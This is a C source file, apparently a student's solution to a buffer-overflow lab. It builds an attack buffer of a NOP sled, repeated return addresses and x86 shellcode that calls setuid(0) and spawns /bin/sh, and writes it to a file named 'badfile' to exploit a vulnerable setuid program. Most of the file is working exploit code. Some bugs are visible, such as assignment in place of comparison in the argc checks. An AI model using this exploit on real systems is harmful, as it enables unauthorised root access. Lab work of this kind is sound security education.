#include <stdlib.h>
#include <stdio.h>
#include <string.h>


//Below is the assembly code for the above C code, which launches a shell
//The first section is the asm code for setuid(0) to elevate to root permission
const char code[]=
        "\x31\xc0" /* Line 1: xorl %eax,%eax */
        "\x31\xdb" /* Line 2: xorl %ebx,%ebx */
        "\xb0\xd5" /* Line 3: movb $0xd5,%al */
        "\xcd\x80" /* Line 4: int $0x80 */
// ---- The code below is the same as the one in Task 1 ---
        "\x31\xc0" /* Line 1: xorl %eax,%eax */
        "\x50" /* Line 2: pushl %eax */
        "\x68" "//sh" /* Line 3: pushl $0x68732f2f */
        "\x68" "/bin" /* Line 4: pushl $0x6e69622f */
        "\x89\xe3" /* Line 5: movl %esp,%ebx */
        "\x50" /* Line 6: pushl %eax */
        "\x53" /* Line 7: pushl %ebx */
        "\x89\xe1" /* Line 8: movl %esp,%ecx */
        "\x99" /* Line 9: cdql */
        "\xb0\x0b" /* Line 10: movb $0x0b,%al */
        "\xcd\x80" /* Line 11: int $0x80 */
;
/*
   The tricky thing about this BOF is that the buffer that were given is size 18
   which is not big enough to contain the shell code that we want to run. Because of this
   we need to inject the shell code after the return address instead of at the beginning of the
   original buffer. The "attack buffer" will be set up like this:

    NOP - (returnAddr) - NOP sled - shell code

   If the buffer were bigger then we would be able to inject the shell code in the
   original buffer and set the return address to the buffer's address
 */

//Function returns the stack pointer
unsigned long get_sp(void) {
        __asm__("movl %esp,%eax");
}

void main(int argc, char**argv){
        int buffer_size = 517;
        int offset = 0;
        FILE* badfile;

        //arg1 = buffersize, arg2 = offset
        if(argc = 2) { buffer_size = atoi(argv[1]); }
        if(argc =3) { buffer_size = atoi(argv[1]); offset = atoi(argv[2]); }

        char buffer[buffer_size];
        memset(&buffer,0x90, buffer_size);

        //*((long*)buffer + 0x36) =  0xbfffeb9e + 0x128;
        long* return_addr = get_sp() + offset;

        printf("\nUsing address 0x%x\nBuffer size: %i\nOffset: %i\n", get_sp(), buffer_size, offset);

        long* ptr_addr = (long*)(buffer + 2); //offset by half byte, cast as long
        //ptr_addr = (long*)ptr;

        for(int i=0; i<8; i++) {  //insert return address
                *(ptr_addr++) = return_addr;  
        }
        //memcpy(ptr_addr, return_addr, 8);

        for(int i=0; i<sizeof(code); i++) {
                buffer[buffer_size - (sizeof(code) +1) +i] = code[i]; //copy the shellcode into the buffer
        }

        buffer[buffer_size -1 ] = '\0'; //null terminator
        printf("Buffer created, writing to badfile\n");

        //Save contents to the file "badfile"
        badfile = fopen("badfile", "w");
        fwrite(buffer, 517,1,badfile);
        fclose(badfile);
}
